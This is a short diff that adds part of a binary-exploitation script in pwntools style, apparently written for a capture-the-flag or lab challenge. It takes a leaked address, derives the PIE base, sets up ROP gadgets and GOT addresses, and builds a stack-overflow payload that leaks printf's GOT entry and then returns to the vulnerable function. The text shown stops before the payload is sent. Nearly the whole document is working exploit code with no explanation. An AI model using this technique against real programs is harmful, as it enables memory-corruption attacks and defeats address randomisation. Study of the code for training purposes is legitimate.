@@ -1,0 +1,22 @@
+main = int(p.recvline().split(b": ")[1].strip(), 16)
+
+pie_base = main - elf.symbols['main']
+
+elf.address = pie_base
+
+pop_rdi = pie_base + 0x0000000000000903 # pop rdi; ret;
+pop_rsi_r15 = pie_base + 0x0000000000000901 # pop rsi; pop r15; ret; 
+got = pie_base + 0x000000000201040
+fmt = pie_base + 0x924
+bss = elf.bss()
+
+log.info("PIE:     "+hex(pie_base))
+
+
+payload = b"A"*40
+payload += p64(pop_rdi + 1)
+payload += p64(pop_rdi)
+payload += p64(elf.got['printf'])
+payload += p64(elf.plt['printf'])
+payload += p64(elf.symbols['vuln'])
+pause()
